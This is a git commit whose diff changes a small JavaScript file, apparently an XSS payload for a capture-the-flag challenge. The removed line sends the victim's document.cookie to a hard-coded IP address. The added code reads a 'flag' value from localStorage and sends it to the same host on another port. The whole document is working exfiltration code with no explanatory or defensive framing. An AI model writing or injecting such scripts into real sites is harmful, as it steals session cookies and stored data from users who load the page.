705fe53303f336cde424225363fa0ebbfd4121f1
zIxyd <135143808+zIxyd@users.noreply.github.com>
2024-10-23 20:47:39 +0800

    Update a.js

--- a.js
+++ a.js
@@ -1,1 +1,9 @@
-fetch('http://81.71.13.76:5656/?c='+document.cookie);
+const flag = localStorage.getItem('flag');
+
+// 发送 flag 值到指定的 URL
+fetch(`http://81.71.13.76:5859?flag=${encodeURIComponent(flag)}`, {
+    method: 'GET',
+})
+.then(response => response.text())
+.then(data => console.log('Response:', data))
+.catch(error => console.error('Error:', error));
